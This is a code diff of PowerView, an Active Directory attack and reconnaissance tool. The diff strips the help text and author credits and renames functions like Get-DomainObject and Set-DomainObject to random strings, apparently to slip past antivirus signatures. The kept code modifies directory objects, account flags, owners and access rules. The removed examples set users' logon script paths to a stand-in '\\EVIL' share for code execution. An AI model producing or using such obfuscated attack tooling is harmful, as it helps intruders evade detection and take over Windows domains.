-
-https://blogs.technet.microsoft.com/pie/2014/08/25/metadata-1-when-did-the-delegation-change-how-to-track-security-descriptor-modifications/
-#>
 
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
     [OutputType('PowerView.ADObjectAttributeHistory')]
@@ -6874,7 +4122,7 @@ https://blogs.technet.microsoft.com/pie/2014/08/25/metadata-1-when-did-the-deleg
     PROCESS {
         if ($PSBoundParameters['Identity']) { $SearcherArguments['Identity'] = $Identity }
 
-        Get-DomainObject @SearcherArguments | ForEach-Object {
+        U3GGBSG9 @SearcherArguments | ForEach-Object {
             $ObjectDN = $_.Properties['distinguishedname'][0]
             ForEach($XMLNode in $_.Properties['msds-replattributemetadata']) {
                 $TempObject = [xml]$XMLNode | Select-Object -ExpandProperty 'DS_REPL_ATTR_META_DATA' -ErrorAction SilentlyContinue
@@ -6891,7 +4139,7 @@ https://blogs.technet.microsoft.com/pie/2014/08/25/metadata-1-when-did-the-deleg
                     }
                 }
                 else {
-                    Write-Verbose "[Get-DomainObjectAttributeHistory] Error retrieving 'msds-replattributemetadata' for '$ObjectDN'"
+                    Write-Verbose "[U3GGBSG9AttributeHistory] Error retrieving 'msds-replattributemetadata' for '$ObjectDN'"
                 }
             }
         }
@@ -6899,161 +4147,8 @@ https://blogs.technet.microsoft.com/pie/2014/08/25/metadata-1-when-did-the-deleg
 }
 
 
-function Get-DomainObjectLinkedAttributeHistory {
-<#
-.SYNOPSIS
+function U3GGBSG9LinkedAttributeHistory {
 
-Returns the Active Directory links attribute value replication metadata for the
-specified object, i.e. a parsed version of the msds-replvaluemetadata attribute.
-By default, replication data for every domain object is returned.
-
-Author: Will Schroeder (@harmj0y)  
-License: BSD 3-Clause  
-Required Dependencies: Get-DomainObject
-
-.DESCRIPTION
-
-Wraps Get-DomainObject with a specification to retrieve the property 'msds-replvaluemetadata'.
-This is the domain linked attribute value replication metadata associated with the object. The
-results are parsed from their XML string form and returned as a custom object.
-
-.PARAMETER Identity
-
-A SamAccountName (e.g. harmj0y), DistinguishedName (e.g. CN=harmj0y,CN=Users,DC=testlab,DC=local),
-SID (e.g. S-1-5-21-890171859-3433809279-3366196753-1108), or GUID (e.g. 4c435dd7-dc58-4b14-9a5e-1fdb0e80d201).
-Wildcards accepted.
-
-.PARAMETER Domain
-
-Specifies the domain to use for the query, defaults to the current domain.
-
-.PARAMETER LDAPFilter
-
-Specifies an LDAP query string that is used to filter Active Directory objects.
-
-.PARAMETER Properties
-
-Only return replication metadata on the specified property names.
-
-.PARAMETER SearchBase
-
-The LDAP source to search through, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
-Useful for OU queries.
-
-.PARAMETER Server
-
-Specifies an Active Directory server (domain controller) to bind to.
-
-.PARAMETER SearchScope
-
-Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).
-
-.PARAMETER ResultPageSize
-
-Specifies the PageSize to set for the LDAP searcher object.
-
-.PARAMETER ServerTimeLimit
-
-Specifies the maximum amount of time the server spends searching. Default of 120 seconds.
-
-.PARAMETER Tombstone
-
-Switch. Specifies that the searcher should also return deleted/tombstoned objects.
-
-.PARAMETER Credential
-
-A [Management.Automation.PSCredential] object of alternate credentials
-for connection to the target domain.
-
-.EXAMPLE
-
-Get-DomainObjectLinkedAttributeHistory | Group-Object ObjectDN | ft -a
-
-Count Name
------ ----
-    4 CN=Administrators,CN=Builtin,DC=testlab,DC=local
-    4 CN=Users,CN=Builtin,DC=testlab,DC=local
-    2 CN=Guests,CN=Builtin,DC=testlab,DC=local
-    1 CN=IIS_IUSRS,CN=Builtin,DC=testlab,DC=local
-    1 CN=Schema Admins,CN=Users,DC=testlab,DC=local
-    1 CN=Enterprise Admins,CN=Users,DC=testlab,DC=local
-    4 CN=Domain Admins,CN=Users,DC=testlab,DC=local
-    1 CN=Group Policy Creator Owners,CN=Users,DC=testlab,DC=local
-    1 CN=Pre-Windows 2000 Compatible Access,CN=Builtin,DC=testlab,DC=local
-    1 CN=Windows Authorization Access Group,CN=Builtin,DC=testlab,DC=local
-    8 CN=Denied RODC Password Replication Group,CN=Users,DC=testlab,DC=local
-    2 CN=PRIMARY,CN=Topology,CN=Domain System Volume,CN=DFSR-GlobalSettings,...
-    1 CN=Domain System Volume,CN=DFSR-LocalSettings,CN=PRIMARY,OU=Domain Con...
-    1 CN=ServerAdmins,CN=Users,DC=testlab,DC=local
-    3 CN=DomainLocalGroup,CN=Users,DC=testlab,DC=local
-
-
-.EXAMPLE
-
-'S-1-5-21-883232822-274137685-4173207997-519','af94f49e-61a5-4f7d-a17c-d80fb16a5220' | Get-DomainObjectLinkedAttributeHistory
-
-ObjectDN              : CN=Enterprise Admins,CN=Users,DC=testlab,DC=local
-ObjectGuid            : 94e782c1-16a1-400b-a7d0-1126038c6387
-AttributeName         : member
-AttributeValue        : CN=Administrator,CN=Users,DC=testlab,DC=local
-TimeDeleted           : 2017-03-06T00:48:29Z
-TimeCreated           : 2017-03-06T00:48:29Z
-LastOriginatingChange : 2017-03-06T00:48:29Z
-Version               : 1
-LastOriginatingDsaDN  : CN=NTDS Settings,CN=PRIMARY,CN=Servers,CN=Default-First
-                        -Site-Name,CN=Sites,CN=Configuration,DC=testlab,DC=loca
-                        l
-
-ObjectDN              : CN=Domain Admins,CN=Users,DC=testlab,DC=local
-ObjectGuid            : af94f49e-61a5-4f7d-a17c-d80fb16a5220
-AttributeName         : member
-AttributeValue        : CN=dfm,CN=Users,DC=testlab,DC=local
-TimeDeleted           : 2017-06-13T22:20:02Z
-TimeCreated           : 2017-06-13T22:20:02Z
-LastOriginatingChange : 2017-06-13T22:20:22Z
-Version               : 2
-LastOriginatingDsaDN  : CN=NTDS Settings,CN=PRIMARY,CN=Servers,CN=Default-First
-                        -Site-Name,CN=Sites,CN=Configuration,DC=testlab,DC=loca
-                        l
-
-ObjectDN              : CN=Domain Admins,CN=Users,DC=testlab,DC=local
-ObjectGuid            : af94f49e-61a5-4f7d-a17c-d80fb16a5220
-AttributeName         : member
-AttributeValue        : CN=Administrator,CN=Users,DC=testlab,DC=local
-TimeDeleted           : 2017-03-06T00:48:29Z
-TimeCreated           : 2017-03-06T00:48:29Z
-LastOriginatingChange : 2017-03-06T00:48:29Z
-Version               : 1
-LastOriginatingDsaDN  : CN=NTDS Settings,CN=PRIMARY,CN=Servers,CN=Default-First
-                        -Site-Name,CN=Sites,CN=Configuration,DC=testlab,DC=loca
-                        l
-
-.EXAMPLE
-
-Get-DomainObjectLinkedAttributeHistory ServerAdmins -Domain testlab.local
-
-ObjectDN              : CN=ServerAdmins,CN=Users,DC=testlab,DC=local
-ObjectGuid            : 603b46ad-555c-49b3-8745-c0718febefc2
-AttributeName         : member
-AttributeValue        : CN=jason.a,CN=Users,DC=dev,DC=testlab,DC=local
-TimeDeleted           : 2017-04-10T22:17:19Z
-TimeCreated           : 2017-04-10T22:17:19Z
-LastOriginatingChange : 2017-04-10T22:17:19Z
-Version               : 1
-LastOriginatingDsaDN  : CN=NTDS Settings,CN=PRIMARY,CN=Servers,CN=Default-First
-                        -Site-Name,CN=Sites,CN=Configuration,DC=testlab,DC=loca
-                        l
-
-.OUTPUTS
-
-PowerView.ADObjectLinkedAttributeHistory
-
-Custom PSObject with translated replication metadata fields.
-
-.LINK
-
-https://blogs.technet.microsoft.com/pie/2014/08/25/metadata-2-the-ephemeral-admin-or-how-to-track-the-group-membership/
-#>
 
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
     [OutputType('PowerView.ADObjectLinkedAttributeHistory')]
@@ -7136,7 +4231,7 @@ https://blogs.technet.microsoft.com/pie/2014/08/25/metadata-2-the-ephemeral-admi
     PROCESS {
         if ($PSBoundParameters['Identity']) { $SearcherArguments['Identity'] = $Identity }
 
-        Get-DomainObject @SearcherArguments | ForEach-Object {
+        U3GGBSG9 @SearcherArguments | ForEach-Object {
             $ObjectDN = $_.Properties['distinguishedname'][0]
             ForEach($XMLNode in $_.Properties['msds-replvaluemetadata']) {
                 $TempObject = [xml]$XMLNode | Select-Object -ExpandProperty 'DS_REPL_VALUE_META_DATA' -ErrorAction SilentlyContinue
@@ -7156,7 +4251,7 @@ https://blogs.technet.microsoft.com/pie/2014/08/25/metadata-2-the-ephemeral-admi
                     }
                 }
                 else {
-                    Write-Verbose "[Get-DomainObjectLinkedAttributeHistory] Error retrieving 'msds-replvaluemetadata' for '$ObjectDN'"
+                    Write-Verbose "[U3GGBSG9LinkedAttributeHistory] Error retrieving 'msds-replvaluemetadata' for '$ObjectDN'"
                 }
             }
         }
@@ -7164,154 +4259,8 @@ https://blogs.technet.microsoft.com/pie/2014/08/25/metadata-2-the-ephemeral-admi
 }
 
 
-function Set-DomainObject {
-<#
-.SYNOPSIS
+function IP5Z2840 {
 
-Modifies a gven property for a specified active directory object.
-
-Author: Will Schroeder (@harmj0y)  
-License: BSD 3-Clause  
-Required Dependencies: Get-DomainObject  
-
-.DESCRIPTION
-
-Splats user/object targeting parameters to Get-DomainObject, returning the raw
-searchresult object. Retrieves the raw directoryentry for the object, and sets
-any values from -Set @{}, XORs any values from -XOR @{}, and clears any values
-from -Clear @().
-
-.PARAMETER Identity
-
-A SamAccountName (e.g. harmj0y), DistinguishedName (e.g. CN=harmj0y,CN=Users,DC=testlab,DC=local),
-SID (e.g. S-1-5-21-890171859-3433809279-3366196753-1108), or GUID (e.g. 4c435dd7-dc58-4b14-9a5e-1fdb0e80d201).
-Wildcards accepted.
-
-.PARAMETER Set
-
-Specifies values for one or more object properties (in the form of a hashtable) that will replace the current values.
-
-.PARAMETER XOR
-
-Specifies values for one or more object properties (in the form of a hashtable) that will XOR the current values.
-
-.PARAMETER Clear
-
-Specifies an array of object properties that will be cleared in the directory.
-
-.PARAMETER Domain
-
-Specifies the domain to use for the query, defaults to the current domain.
-
-.PARAMETER LDAPFilter
-
-Specifies an LDAP query string that is used to filter Active Directory objects.
-
-.PARAMETER SearchBase
-
-The LDAP source to search through, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
-Useful for OU queries.
-
-.PARAMETER Server
-
-Specifies an Active Directory server (domain controller) to bind to.
-
-.PARAMETER SearchScope
-
-Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).
-
-.PARAMETER ResultPageSize
-
-Specifies the PageSize to set for the LDAP searcher object.
-
-.PARAMETER ServerTimeLimit
-
-Specifies the maximum amount of time the server spends searching. Default of 120 seconds.
-
-.PARAMETER Tombstone
-
-Switch. Specifies that the searcher should also return deleted/tombstoned objects.
-
-.PARAMETER Credential
-
-A [Management.Automation.PSCredential] object of alternate credentials
-for connection to the target domain.
-
-.EXAMPLE
-
-Set-DomainObject testuser -Set @{'mstsinitialprogram'='\\EVIL\program.exe'} -Verbose
-
-VERBOSE: Get-DomainSearcher search string: LDAP://PRIMARY.testlab.local/DC=testlab,DC=local
-VERBOSE: Get-DomainObject filter string: (&(|(samAccountName=testuser)))
-VERBOSE: Setting mstsinitialprogram to \\EVIL\program.exe for object testuser
-
-.EXAMPLE
-
-"S-1-5-21-890171859-3433809279-3366196753-1108","testuser" | Set-DomainObject -Set @{'countrycode'=1234; 'mstsinitialprogram'='\\EVIL\program2.exe'} -Verbose
-
-VERBOSE: Get-DomainSearcher search string: LDAP://PRIMARY.testlab.local/DC=testlab,DC=local
-VERBOSE: Get-DomainObject filter string:
-(&(|(objectsid=S-1-5-21-890171859-3433809279-3366196753-1108)))
-VERBOSE: Setting mstsinitialprogram to \\EVIL\program2.exe for object harmj0y
-VERBOSE: Setting countrycode to 1234 for object harmj0y
-VERBOSE: Get-DomainSearcher search string:
-LDAP://PRIMARY.testlab.local/DC=testlab,DC=local
-VERBOSE: Get-DomainObject filter string: (&(|(samAccountName=testuser)))
-VERBOSE: Setting mstsinitialprogram to \\EVIL\program2.exe for object testuser
-VERBOSE: Setting countrycode to 1234 for object testuser
-
-.EXAMPLE
-
-"S-1-5-21-890171859-3433809279-3366196753-1108","testuser" | Set-DomainObject -Clear department -Verbose
-
-Cleares the 'department' field for both object identities.
-
-.EXAMPLE
-
-Get-DomainUser testuser | ConvertFrom-UACValue -Verbose
-
-Name                           Value
-----                           -----
-NORMAL_ACCOUNT                 512
-
-
-Set-DomainObject -Identity testuser -XOR @{useraccountcontrol=65536} -Verbose
-
-VERBOSE: Get-DomainSearcher search string: LDAP://PRIMARY.testlab.local/DC=testlab,DC=local
-VERBOSE: Get-DomainObject filter string: (&(|(samAccountName=testuser)))
-VERBOSE: XORing 'useraccountcontrol' with '65536' for object 'testuser'
-
-Get-DomainUser testuser | ConvertFrom-UACValue -Verbose
-
-Name                           Value
-----                           -----
-NORMAL_ACCOUNT                 512
-DONT_EXPIRE_PASSWORD           65536
-
-.EXAMPLE
-
-Get-DomainUser -Identity testuser -Properties scriptpath
-
-scriptpath
-----------
-\\primary\sysvol\blah.ps1
-
-$SecPassword = ConvertTo-SecureString 'Password123!'-AsPlainText -Force
-$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
-Set-DomainObject -Identity testuser -Set @{'scriptpath'='\\EVIL\program2.exe'} -Credential $Cred -Verbose
-VERBOSE: [Get-Domain] Using alternate credentials for Get-Domain
-VERBOSE: [Get-Domain] Extracted domain 'TESTLAB' from -Credential
-VERBOSE: [Get-DomainSearcher] search string: LDAP://PRIMARY.testlab.local/DC=testlab,DC=local
-VERBOSE: [Get-DomainSearcher] Using alternate credentials for LDAP connection
-VERBOSE: [Get-DomainObject] Get-DomainObject filter string: (&(|(|(samAccountName=testuser)(name=testuser))))
-VERBOSE: [Set-DomainObject] Setting 'scriptpath' to '\\EVIL\program2.exe' for object 'testuser'
-
-Get-DomainUser -Identity testuser -Properties scriptpath
-
-scriptpath
-----------
-\\EVIL\program2.exe
-#>
 
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
@@ -7390,8 +4339,8 @@ scriptpath
     PROCESS {
         if ($PSBoundParameters['Identity']) { $SearcherArguments['Identity'] = $Identity }
 
-        # splat the appropriate arguments to Get-DomainObject
-        $RawObject = Get-DomainObject @SearcherArguments
+        
+        $RawObject = U3GGBSG9 @SearcherArguments
 
         ForEach ($Object in $RawObject) {
 
@@ -7400,13 +4349,13 @@ scriptpath
             if($PSBoundParameters['Set']) {
                 try {
                     $PSBoundParameters['Set'].GetEnumerator() | ForEach-Object {
-                        Write-Verbose "[Set-DomainObject] Setting '$($_.Name)' to '$($_.Value)' for object '$($RawObject.Properties.samaccountname)'"
+                        Write-Verbose "[IP5Z2840] Setting '$($_.Name)' to '$($_.Value)' for object '$($RawObject.Properties.samaccountname)'"
                         $Entry.put($_.Name, $_.Value)
                     }
                     $Entry.commitchanges()
                 }
                 catch {
-                    Write-Warning "[Set-DomainObject] Error setting/replacing properties for object '$($RawObject.Properties.samaccountname)' : $_"
+                    Write-Warning "[IP5Z2840] Error setting/replacing properties for object '$($RawObject.Properties.samaccountname)' : $_"
                 }
             }
             if($PSBoundParameters['XOR']) {
@@ -7414,30 +4363,30 @@ scriptpath
                     $PSBoundParameters['XOR'].GetEnumerator() | ForEach-Object {
                         $PropertyName = $_.Name
                         $PropertyXorValue = $_.Value
-                        Write-Verbose "[Set-DomainObject] XORing '$PropertyName' with '$PropertyXorValue' for object '$($RawObject.Properties.samaccountname)'"
+                        Write-Verbose "[IP5Z2840] XORing '$PropertyName' with '$PropertyXorValue' for object '$($RawObject.Properties.samaccountname)'"
                         $TypeName = $Entry.$PropertyName[0].GetType().name
 
-                        # UAC value references- https://support.microsoft.com/en-us/kb/305144
+                        
                         $PropertyValue = $($Entry.$PropertyName) -bxor $PropertyXorValue
                         $Entry.$PropertyName = $PropertyValue -as $TypeName
                     }
                     $Entry.commitchanges()
                 }
                 catch {
-                    Write-Warning "[Set-DomainObject] Error XOR'ing properties for object '$($RawObject.Properties.samaccountname)' : $_"
+                    Write-Warning "[IP5Z2840] Error XOR'ing properties for object '$($RawObject.Properties.samaccountname)' : $_"
                 }
             }
             if($PSBoundParameters['Clear']) {
                 try {
                     $PSBoundParameters['Clear'] | ForEach-Object {
                         $PropertyName = $_
-                        Write-Verbose "[Set-DomainObject] Clearing '$PropertyName' for object '$($RawObject.Properties.samaccountname)'"
+                        Write-Verbose "[IP5Z2840] Clearing '$PropertyName' for object '$($RawObject.Properties.samaccountname)'"
                         $Entry.$PropertyName.clear()
                     }
                     $Entry.commitchanges()
                 }
                 catch {
-                    Write-Warning "[Set-DomainObject] Error clearing properties for object '$($RawObject.Properties.samaccountname)' : $_"
+                    Write-Warning "[IP5Z2840] Error clearing properties for object '$($RawObject.Properties.samaccountname)' : $_"
                 }
             }
         }
@@ -7446,37 +4395,7 @@ scriptpath
 
 
 function ConvertFrom-LDAPLogonHours {
-<#
-.SYNOPSIS
 
-Converts the LDAP LogonHours array to a processible object.
-
-Author: Lee Christensen (@tifkin_)  
-License: BSD 3-Clause  
-Required Dependencies: None
-
-.DESCRIPTION
-
-Converts the LDAP LogonHours array to a processible object.  Each entry
-property in the output object corresponds to a day of the week and hour during
-the day (in UTC) indicating whether or not the user can logon at the specified
-hour.
-
-.PARAMETER LogonHoursArray
-
-21-byte LDAP hours array.
-
-.EXAMPLE
-
-$hours = (Get-DomainUser -LDAPFilter 'userworkstations=*')[0].logonhours
-ConvertFrom-LDAPLogonHours $hours
-
-Gets the logonhours array from the first AD user with logon restrictions.
-
-.OUTPUTS
-
-PowerView.LogonHours
-#>
 
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
@@ -7539,103 +4458,7 @@ PowerView.LogonHours
 
 
 function New-ADObjectAccessControlEntry {
-<#
-.SYNOPSIS
 
-Creates a new Active Directory object-specific access control entry.
-
-Author: Lee Christensen (@tifkin_)  
-License: BSD 3-Clause  
-Required Dependencies: None
-
-.DESCRIPTION
-
-Creates a new object-specific access control entry (ACE).  The ACE could be 
-used for auditing access to an object or controlling access to objects.
-
-.PARAMETER PrincipalIdentity
-
-A SamAccountName (e.g. harmj0y), DistinguishedName (e.g. CN=harmj0y,CN=Users,DC=testlab,DC=local),
-SID (e.g. S-1-5-21-890171859-3433809279-3366196753-1108), or GUID (e.g. 4c435dd7-dc58-4b14-9a5e-1fdb0e80d201)
-for the domain principal to add for the ACL. Required. Wildcards accepted.
-
-.PARAMETER PrincipalDomain
-
-Specifies the domain for the TargetIdentity to use for the principal, defaults to the current domain.
-
-.PARAMETER PrincipalSearchBase
-
-The LDAP source to search through for principals, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
-Useful for OU queries.
-
-.PARAMETER Server
-
-Specifies an Active Directory server (domain controller) to bind to.
-
-.PARAMETER SearchScope
-
-Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).
-
-.PARAMETER ResultPageSize
-
-Specifies the PageSize to set for the LDAP searcher object.
-
-.PARAMETER ServerTimeLimit
-
-Specifies the maximum amount of time the server spends searching. Default of 120 seconds.
-
-.PARAMETER Tombstone
-
-Switch. Specifies that the searcher should also return deleted/tombstoned objects.
-
-.PARAMETER Credential
-
-A [Management.Automation.PSCredential] object of alternate credentials
-for connection to the target domain.
-
-.PARAMETER Right
-
-Specifies the rights set on the Active Directory object.
-
-.PARAMETER AccessControlType
-
-Specifies the type of ACE (allow or deny)
-
-.PARAMETER AuditFlag
-
-For audit ACEs, specifies when to create an audit log (on success or failure)
-
-.PARAMETER ObjectType
-
-Specifies the GUID of the object that the ACE applies to.
-
-.PARAMETER InheritanceType
-
-Specifies how the ACE applies to the object and/or its children.
-
-.PARAMETER InheritedObjectType
-
-Specifies the type of object that can inherit the ACE.
-
-.EXAMPLE
-
-$Guids = Get-DomainGUIDMap
-$AdmPropertyGuid = $Guids.GetEnumerator() | ?{$_.value -eq 'ms-Mcs-AdmPwd'} | select -ExpandProperty name
-$CompPropertyGuid = $Guids.GetEnumerator() | ?{$_.value -eq 'Computer'} | select -ExpandProperty name
-$ACE = New-ADObjectAccessControlEntry -Verbose -PrincipalIdentity itadmin -Right ExtendedRight,ReadProperty -AccessControlType Allow -ObjectType $AdmPropertyGuid -InheritanceType All -InheritedObjectType $CompPropertyGuid
-$OU = Get-DomainOU -Raw Workstations
-$DsEntry = $OU.GetDirectoryEntry()
-$dsEntry.PsBase.Options.SecurityMasks = 'Dacl'
-$dsEntry.PsBase.ObjectSecurity.AddAccessRule($ACE)
-$dsEntry.PsBase.CommitChanges()
-
-Adds an ACE to all computer objects in the OU "Workstations" permitting the
-user "itadmin" to read the confidential ms-Mcs-AdmPwd computer property.
-
-.OUTPUTS
-
-System.Security.AccessControl.AuthorizationRule
-#>
 
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
@@ -7716,7 +4539,7 @@ System.Security.AccessControl.AuthorizationRule
             if ($PSBoundParameters['ServerTimeLimit']) { $PrincipalSearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
             if ($PSBoundParameters['Tombstone']) { $PrincipalSearcherArguments['Tombstone'] = $Tombstone }
             if ($PSBoundParameters['Credential']) { $PrincipalSearcherArguments['Credential'] = $Credential }
-            $Principal = Get-DomainObject @PrincipalSearcherArguments
+            $Principal = U3GGBSG9 @PrincipalSearcherArguments
             if (-not $Principal) {
                 throw "Unable to resolve principal: $PrincipalIdentity"
             }
@@ -7777,86 +4600,8 @@ System.Security.AccessControl.AuthorizationRule
 }
 
 
-function Set-DomainObjectOwner {
-<#
-.SYNOPSIS
+function IP5Z2840Owner {
 
-Modifies the owner for a specified active directory object.
-
-Author: Will Schroeder (@harmj0y)  
-License: BSD 3-Clause  
-Required Dependencies: Get-DomainObject  
-
-.DESCRIPTION
-
-Retrieves the Active Directory object specified by -Identity by splatting to
-Get-DomainObject, returning the raw searchresult object. Retrieves the raw
-directoryentry for the object, and sets the object owner to -OwnerIdentity.
-
-.PARAMETER Identity
-
-A SamAccountName (e.g. harmj0y), DistinguishedName (e.g. CN=harmj0y,CN=Users,DC=testlab,DC=local),
-SID (e.g. S-1-5-21-890171859-3433809279-3366196753-1108), or GUID (e.g. 4c435dd7-dc58-4b14-9a5e-1fdb0e80d201)
-of the AD object to set the owner for.
-
-.PARAMETER OwnerIdentity
-
-A SamAccountName (e.g. harmj0y), DistinguishedName (e.g. CN=harmj0y,CN=Users,DC=testlab,DC=local),
-SID (e.g. S-1-5-21-890171859-3433809279-3366196753-1108), or GUID (e.g. 4c435dd7-dc58-4b14-9a5e-1fdb0e80d201)
-of the owner to set for -Identity.
-
-.PARAMETER Domain
-
-Specifies the domain to use for the query, defaults to the current domain.
-
-.PARAMETER LDAPFilter
-
-Specifies an LDAP query string that is used to filter Active Directory objects.
-
-.PARAMETER SearchBase
-
-The LDAP source to search through, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
-Useful for OU queries.
-
-.PARAMETER Server
-
-Specifies an Active Directory server (domain controller) to bind to.
-
-.PARAMETER SearchScope
-
-Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).
-
-.PARAMETER ResultPageSize
-
-Specifies the PageSize to set for the LDAP searcher object.
-
-.PARAMETER ServerTimeLimit
-
-Specifies the maximum amount of time the server spends searching. Default of 120 seconds.
-
-.PARAMETER Tombstone
-
-Switch. Specifies that the searcher should also return deleted/tombstoned objects.
-
-.PARAMETER Credential
-
-A [Management.Automation.PSCredential] object of alternate credentials
-for connection to the target domain.
-
-.EXAMPLE
-
-Set-DomainObjectOwner -Identity dfm -OwnerIdentity harmj0y
-
-Set the owner of 'dfm' in the current domain to 'harmj0y'.
-
-.EXAMPLE
-
-$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
-$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
-Set-DomainObjectOwner -Identity dfm -OwnerIdentity harmj0y -Credential $Cred
-
-Set the owner of 'dfm' in the current domain to 'harmj0y' using the alternate credentials.
-#>
 
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
@@ -7924,12 +4669,12 @@ Set the owner of 'dfm' in the current domain to 'harmj0y' using the alternate cr
         if ($PSBoundParameters['Tombstone']) { $SearcherArguments['Tombstone'] = $Tombstone }
         if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }
 
-        $OwnerSid = Get-DomainObject @SearcherArguments -Identity $OwnerIdentity -Properties objectsid | Select-Object -ExpandProperty objectsid
+        $OwnerSid = U3GGBSG9 @SearcherArguments -Identity $OwnerIdentity -Properties objectsid | Select-Object -ExpandProperty objectsid
         if ($OwnerSid) {
             $OwnerIdentityReference = [System.Security.Principal.SecurityIdentifier]$OwnerSid
         }
         else {
-            Write-Warning "[Set-DomainObjectOwner] Error parsing owner identity '$OwnerIdentity'"
+            Write-Warning "[IP5Z2840Owner] Error parsing owner identity '$OwnerIdentity'"
         }
     }
 
@@ -7938,19 +4683,19 @@ Set the owner of 'dfm' in the current domain to 'harmj0y' using the alternate cr
             $SearcherArguments['Raw'] = $True
             $SearcherArguments['Identity'] = $Identity
 
-            # splat the appropriate arguments to Get-DomainObject
-            $RawObject = Get-DomainObject @SearcherArguments
+            
+            $RawObject = U3GGBSG9 @SearcherArguments
 
             ForEach ($Object in $RawObject) {
                 try {
-                    Write-Verbose "[Set-DomainObjectOwner] Attempting to set the owner for '$Identity' to '$OwnerIdentity'"
+                    Write-Verbose "[IP5Z2840Owner] Attempting to set the owner for '$Identity' to '$OwnerIdentity'"
                     $Entry = $RawObject.GetDirectoryEntry()
                     $Entry.PsBase.Options.SecurityMasks = 'Owner'
                     $Entry.PsBase.ObjectSecurity.SetOwner($OwnerIdentityReference)
                     $Entry.PsBase.CommitChanges()
                 }
                 catch {
-                    Write-Warning "[Set-DomainObjectOwner] Error setting owner: $_"
+                    Write-Warning "[IP5Z2840Owner] Error setting owner: $_"
                 }
             }
         }
@@ -7958,104 +4703,8 @@ Set the owner of 'dfm' in the current domain to 'harmj0y' using the alternate cr
 }
 
 
-function Get-DomainObjectAcl {
-<#
-.SYNOPSIS
+function U3GGBSG9Acl {
 
-Returns the ACLs associated with a specific active directory object. By default
-the DACL for the object(s) is returned, but the SACL can be returned with -Sacl.
-
-Author: Will Schroeder (@harmj0y)  
-License: BSD 3-Clause  
-Required Dependencies: Get-DomainSearcher, Get-DomainGUIDMap  
-
-.PARAMETER Identity
-
-A SamAccountName (e.g. harmj0y), DistinguishedName (e.g. CN=harmj0y,CN=Users,DC=testlab,DC=local),
-SID (e.g. S-1-5-21-890171859-3433809279-3366196753-1108), or GUID (e.g. 4c435dd7-dc58-4b14-9a5e-1fdb0e80d201).
-Wildcards accepted.
-
-.PARAMETER Sacl
-
-Switch. Return the SACL instead of the DACL for the object (default behavior).
-
-.PARAMETER ResolveGUIDs
-
-Switch. Resolve GUIDs to their display names.
-
-.PARAMETER RightsFilter
-
-A specific set of rights to return ('All', 'ResetPassword', 'WriteMembers').
-
-.PARAMETER Domain
-
-Specifies the domain to use for the query, defaults to the current domain.
-
-.PARAMETER LDAPFilter
-
-Specifies an LDAP query string that is used to filter Active Directory objects.
-
-.PARAMETER SearchBase
-
-The LDAP source to search through, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
-Useful for OU queries.
-
-.PARAMETER Server
-
-Specifies an Active Directory server (domain controller) to bind to.
-
-.PARAMETER SearchScope
-
-Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).
-
-.PARAMETER ResultPageSize
-
-Specifies the PageSize to set for the LDAP searcher object.
-
-.PARAMETER ServerTimeLimit
-
-Specifies the maximum amount of time the server spends searching. Default of 120 seconds.
-
-.PARAMETER Tombstone
-
-Switch. Specifies that the searcher should also return deleted/tombstoned objects.
-
-.PARAMETER Credential
-
-A [Management.Automation.PSCredential] object of alternate credentials
-for connection to the target domain.
-
-.EXAMPLE
-
-Get-DomainObjectAcl -Identity matt.admin -domain testlab.local -ResolveGUIDs
-
-Get the ACLs for the matt.admin user in the testlab.local domain and
-resolve relevant GUIDs to their display names.
-
-.EXAMPLE
-
-Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs
-
-Enumerate the ACL permissions for all OUs in the domain.
-
-.EXAMPLE
-
-Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs -Sacl
-
-Enumerate the SACLs for all OUs in the domain, resolving GUIDs.
-
-.EXAMPLE
-
-$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
-$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
-Get-DomainObjectAcl -Credential $Cred -ResolveGUIDs
-
-.OUTPUTS
-
-PowerView.ACL
-
-Custom PSObject with ACL entries.
-#>
 
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
     [OutputType('PowerView.ACL')]
@@ -8135,7 +4784,7 @@ Custom PSObject with ACL entries.
         if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
         if ($PSBoundParameters['Tombstone']) { $SearcherArguments['Tombstone'] = $Tombstone }
         if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }
-        $Searcher = Get-DomainSearcher @SearcherArguments
+        $Searcher = NJUXTHTL @SearcherArguments
 
